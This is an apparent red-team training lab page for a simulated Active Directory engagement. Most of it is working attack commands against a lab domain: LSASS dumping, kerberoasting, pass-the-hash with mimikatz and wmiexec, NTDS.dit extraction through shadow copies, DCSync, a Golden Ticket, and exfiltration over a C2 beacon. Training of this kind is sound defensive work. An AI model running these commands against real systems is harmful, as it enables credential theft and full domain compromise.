---
title: "Full Kill-Chain Lab Day 2 — Lateral Movement, Domain Admin, Exfiltration"
tags: [red-team, kill-chain, lab, lateral-movement, domain-admin, DCSync, exfiltration,
  ATT&CK, T1003, T1021, T1041]
module: 08-RedTeam-02
day: 507
related_topics:
  - Full Kill-Chain Lab Day 1 (Day 506)
  - Purple Team Concepts (Day 508)
  - Domain Dominance (Day 499)
  - Lateral Movement Advanced (Day 498)
---

# Day 507 — Full Kill-Chain Lab Day 2: Lateral Movement → Domain Admin → Exfil

> "Day 1 got you in. Day 2 answers the real question: how far can you go?
> The answer is almost always: further than the client expected. That is
> not a flex — that is a finding. Document the blast radius. Show them
> exactly what a real attacker with this level of access could have done.
> That is the report they will act on."
>
> — Ghost

---

## Goals

Execute the second half of the multi-day simulated engagement.
Complete: credential access → AD discovery → lateral movement → DA compromise →
simulated exfiltration.
Produce a full ATT&CK-mapped engagement log ready for the report writing phase.

**Prerequisites:** Day 506 (kill-chain lab day 1) with active beacon and
persistence on WORKSTATION01.
**Time budget:** 6 hours.

---

## Part 1 — Phase 4: Credential Access

Start from the Sliver beacon on WORKSTATION01 (corp\jsmith — standard user).

```bash
# Check privilege level:
[WORKSTATION01] > getprivs
# → SeChangeNotifyPrivilege only — standard user, no admin

# Attempt local privilege escalation (if needed):
# For this lab, jsmith has local admin on WORKSTATION01 (via group policy)
# Check with:
[WORKSTATION01] > execute -o 'whoami /groups | findstr "Administrators"'
# → BUILTIN\Administrators present → local admin

# Dump LSASS via comsvcs.dll (no external binary):
[WORKSTATION01] > execute -o 'powershell -c "$pid = (Get-Process lsass).Id; \
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid \
    C:\ProgramData\Microsoft\Update\ls.dmp full"'

# Wait for completion, then download:
[WORKSTATION01] > download C:\ProgramData\Microsoft\Update\ls.dmp
# Delete the dump file immediately after download:
[WORKSTATION01] > rm C:\ProgramData\Microsoft\Update\ls.dmp

# Parse offline on Kali:
pypykatz lsa minidump ls.dmp > lsass_creds.txt
cat lsass_creds.txt | grep -E "(username|NT|Password)"

# Extract DPAPI secrets (Chrome passwords if browser is installed):
[WORKSTATION01] > execute-assembly /path/to/SharpDPAPI.exe triage
```

### Credential Analysis

```
From the LSASS dump, expect to find:
  jsmith: NTLM hash (own account — logged in locally)
  Possibly: svc_backup cached credentials (if it logged in recently)
  Possibly: helpdesk admin cached if a tech recently worked on this machine

Priority targets:
  1. Any service account with a weak password (Kerberoast target)
  2. Any account with DA or elevated AD rights
  3. Machine account hash (for Silver Ticket if needed)
```

---

## Part 2 — Phase 5: AD Discovery

```powershell
# Use native ADSI (no external binary) to avoid SharpHound noise:
[WORKSTATION01] > execute -o 'powershell -c "
  $searcher = [ADSISearcher]\"(objectClass=user)\"
  $searcher.PropertiesToLoad.AddRange(@(\"samaccountname\",\"memberof\",\"admincount\"))
  $searcher.FindAll() | ForEach-Object {
    $_.Properties[\"samaccountname\"] + \" | admin:\" + $_.Properties[\"admincount\"]
  }
"'
# Look for accounts with admincount=1 (protected by AdminSDHolder — high-priv)

# Enumerate Domain Admins:
[WORKSTATION01] > execute -o 'net group "Domain Admins" /domain'

# Find Kerberoastable accounts:
[WORKSTATION01] > execute-assembly /path/to/Rubeus.exe kerberoast /nowrap
# → List of hashes; identify svc_webapp from earlier lab config

# Enumerate computers:
[WORKSTATION01] > execute -o 'net group "Domain Computers" /domain'

# Find hosts where we have admin (or use BloodHound data from Day 501):
[WORKSTATION01] > execute-assembly /path/to/SharpHound.exe -c DCOnly --zipfilename ad2.zip
[WORKSTATION01] > download ad2.zip
```

---

## Part 3 — Phase 6: Lateral Movement

### Lateral Movement Path Decision

```
Available credentials after Phase 4:
  jsmith NTLM hash (own account — local admin on WORKSTATION01 only)
  svc_backup NTLM hash (from LSASS cache — check group membership)

Check svc_backup groups:
  net user svc_backup /domain
  → Member of: BACKUP_OPERATORS, Domain Users

BloodHound path (from Day 501 data):
  svc_backup → MemberOf → BACKUP_OPERATORS
  BACKUP_OPERATORS → AdminTo → DC01 (Backup Operators have SeBackupPrivilege)

Plan:
  1. Use svc_backup NTLM hash (Over-Pass-the-Hash) to get a Kerberos TGT
  2. Use TGT to access DC01
  3. Exploit SeBackupPrivilege → read NTDS.dit → DCSync equivalent
```

### Execute Lateral Movement

```bash
# Option A: WMI execution with svc_backup hash to DC01
python3 wmiexec.py -hashes :SVC_BACKUP_NTLM_HASH \
    CORPLAB/svc_backup@DC01.corplab.local
# Interactive shell on DC01 as svc_backup

# Option B: Over-Pass-the-Hash via Mimikatz on WORKSTATION01
[WORKSTATION01] > execute-assembly /path/to/mimikatz.exe \
    "sekurlsa::pth /user:svc_backup /domain:corplab.local \
    /ntlm:SVC_BACKUP_NTLM_HASH /run:powershell.exe" exit
# → New PowerShell with svc_backup Kerberos TGT
# In that PowerShell:
# klist → verify TGT for svc_backup
# dir \\DC01.corplab.local\C$ → should succeed if svc_backup has access

# In Sliver: spawn a second beacon running as svc_backup context:
[WORKSTATION01] > execute -o '\\DC01.corplab.local\C$\ProgramData\runner.exe'
# If svc_backup can write to DC01 C$:
[WORKSTATION01] > upload runner.exe \\DC01.corplab.local\C$\ProgramData\runner.exe
```

---

## Part 4 — Phase 7: Privilege Escalation to Domain Admin

### Path A: DCSync from svc_backup (if DCSync rights exist)

```bash
# If svc_backup has DS-Replication-Get-Changes-All (from BloodHound):
[DC01_BEACON] > execute-assembly /path/to/mimikatz.exe \
    "lsadump::dcsync /domain:corplab.local /user:krbtgt" exit
# → krbtgt NTLM hash and AES-256 key

# If not: use SeBackupPrivilege path (below)
```

### Path B: SeBackupPrivilege → NTDS.dit Extraction

```powershell
# BACKUP_OPERATORS have SeBackupPrivilege → can read any file including NTDS.dit
# From a svc_backup session on DC01:

# Step 1: Create a shadow copy of C:\ to get NTDS.dit without locking issues
diskshadow /s shadow.txt
# shadow.txt contents:
#   set context persistent nowriters
#   set metadata C:\Windows\Temp\shadow_meta.cab
#   set verbose on
#   add volume C: alias shadow1
#   create
#   expose %shadow1% Z:

# Step 2: Copy NTDS.dit from the shadow copy:
robocopy /b Z:\Windows\NTDS C:\Windows\Temp\ntds\ NTDS.dit
reg save HKLM\SYSTEM C:\Windows\Temp\ntds\SYSTEM

# Step 3: Download and parse offline:
# (download NTDS.dit + SYSTEM hive to attacker machine)
python3 secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
# → All domain NTLM hashes including krbtgt and Administrator
```

### Path C: Direct DCSync (if DA credentials obtained)

```bash
# If any DA hash is extracted from NTDS.dit:
python3 secretsdump.py -just-dc-user krbtgt \
    CORPLAB/Administrator@DC01.corplab.local -hashes :ADMIN_NTLM_HASH

# Or from a Mimikatz session:
[DC01_BEACON] > execute-assembly /path/to/mimikatz.exe \
    "lsadump::dcsync /domain:corplab.local /all /csv" exit
```

---

## Part 5 — Phase 8: Simulated Exfiltration

In a real engagement, exfiltration demonstrates blast radius to the client.
In the lab: collect a small, synthetic data set and move it through the C2.

```
IMPORTANT: In real engagements, exfiltrate only what is agreed in the ROE.
Never exfiltrate actual client data. Collect metadata (file names, paths,
sizes) to demonstrate what could have been taken — not the actual content.
```

```bash
# From DC01 beacon (now running as Administrator after DA compromise):

# 1. Identify high-value data locations (do not download — just list):
[DC01_BEACON] > execute -o 'dir "C:\Users\Administrator\Documents" /s /b'
[DC01_BEACON] > execute -o 'dir "\\FILESRV.corplab.local\Finance" /s /b 2>nul'
# → Document what exists — this is the finding, not the files themselves

# 2. For lab demonstration: create a synthetic data file and exfil via C2:
[DC01_BEACON] > execute -o 'echo "SYNTHETIC: krtbtg_hash, all_domain_hashes" > C:\Windows\Temp\lab_exfil_demo.txt'
[DC01_BEACON] > download C:\Windows\Temp\lab_exfil_demo.txt
[DC01_BEACON] > rm C:\Windows\Temp\lab_exfil_demo.txt

# 3. Document the exfil path in the engagement log:
# C2 beacon (TCP/443) → redirector → team server → attacker machine
# All traffic: HTTPS, looks like normal browser traffic
# Volume: synthetic 1KB file (real engagement: sensitive data would be staged,
#   compressed, split, and exfiltrated over multiple C2 check-ins)
```

---

## Part 6 — Day 2 Engagement Log + Full ATT&CK Kill-Chain Map

```
=== ENGAGEMENT LOG — Day 2 ===
Date:       2026-05-01
Operator:   Ghost

Phase 4: Credential Access
  09:05 — LSASS dump via comsvcs.dll on WORKSTATION01
    ATT&CK: T1003.001
    Sysmon Event 10 (lsass target) confirmed. No alert fired.
    Credentials obtained: jsmith (NTLM), svc_backup (NTLM, plaintext)

  09:30 — DPAPI triage with SharpDPAPI
    ATT&CK: T1555.003
    Chrome passwords: 3 credentials found (lab-generated synthetic accounts)

Phase 5: AD Discovery
  10:00 — AD enumeration via ADSI PowerShell
    ATT&CK: T1087.002, T1069.002
    Identified: 1 DA account (Administrator), svc_backup in BACKUP_OPERATORS
    Kerberoastable: svc_webapp (SPN set)

Phase 6: Lateral Movement
  10:30 — Over-Pass-the-Hash as svc_backup to DC01
    ATT&CK: T1550.002
    Method: Mimikatz sekurlsa::pth → Kerberos TGT → WMI exec on DC01
    Event 4768 (TGT request) on DC01. Event 4624 (logon type 3) on DC01.

Phase 7: Domain Admin
  11:00 — SeBackupPrivilege → NTDS.dit extraction
    ATT&CK: T1003.003
    NTDS.dit + SYSTEM hive extracted via shadow copy
    secretsdump.py → krbtgt hash obtained
    Domain dominance achieved.

  11:30 — Golden Ticket forged with krbtgt AES-256 key
    ATT&CK: T1558.001
    Verified TGT via klist. Accessed \\DC01\C$ as Administrator.

Phase 8: Exfiltration (simulated)
  12:00 — Synthetic data file exfiltrated via C2 beacon
    ATT&CK: T1041 (Exfiltration Over C2 Channel)
    Volume: 1 KB (synthetic) — demonstrates capability
    Real finding: Finance share, HR data, executive mailbox all accessible
```

### Full ATT&CK Kill-Chain Summary

| Phase | Technique | ATT&CK ID |
|---|---|---|
| Recon | DNS query, port scan | T1590.002, T1046 |
| Initial Access | Phishing + ISO/LNK | T1566.001, T1204.002 |
| Persistence | Scheduled task, Registry Run | T1053.005, T1547.001 |
| Credential Access | LSASS dump (comsvcs.dll) | T1003.001 |
| Discovery | ADSI AD enumeration | T1087.002, T1069.002 |
| Lateral Movement | Over-Pass-the-Hash + WMI | T1550.002, T1047 |
| Privilege Escalation | SeBackupPrivilege + NTDS | T1003.003 |
| Domain Dominance | DCSync / Golden Ticket | T1003.006, T1558.001 |
| Exfiltration | C2 channel | T1041 |

---

## Key Takeaways

1. SeBackupPrivilege on DC members (BACKUP_OPERATORS) is an underappreciated
   DA escalation path. It does not require DA rights — it requires membership
   in a group that has backup rights on the DC. Any account in that group can
   extract NTDS.dit.
2. The full kill-chain from phishing to Golden Ticket took less than 4 hours
   in this lab. Real engagements take longer due to environmental complexity —
   but the same path structure applies.
3. Exfiltration demonstration is about documenting what was accessible, not
   taking real data. The finding reads: "All Finance share content, executive
   mailboxes, and domain password hashes were accessible to the attacker."
   That is more impactful than a 10 GB download.
4. Every phase has a detection signal. The engagement log is also the blueprint
   for a defensive gap analysis: which signals fired, which did not, and which
   detections need to be added.
5. Write the engagement log as you go. After the lab, use it to draft the
   findings section of the report. The structure maps directly: each Phase 4–8
   log entry is a finding with evidence, technique, and impact.

---

## Exercises

1. Execute the full Day 2 chain in the lab. Record every command and its
   timestamp. Verify each step before proceeding to the next.
2. After completing Phase 7 (DA), extract the krbtgt AES-256 key via DCSync.
   Forge a Golden Ticket using the AES key (not NTLM). Verify the difference
   in Kerberos event logs compared to an NTLM-based Golden Ticket.
3. Identify three detection gaps in the engagement: which techniques fired
   no alerts in the lab SIEM? For each gap, write the Sigma rule that would
   close it.
4. Produce a one-page executive summary of the two-day engagement. Write it
   for a non-technical C-level audience: what was accessed, what could have
   been taken, what is the business risk?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q507.1, Q507.2 …).

---

## Navigation

← Previous: [Day 506 — Full Kill-Chain Lab Day 1](DAY-0506-Full-Kill-Chain-Lab-Day-1.md)
→ Next: [Day 508 — Purple Team Concepts](../08-RedTeam-03/DAY-0508-Purple-Team-Concepts.md)
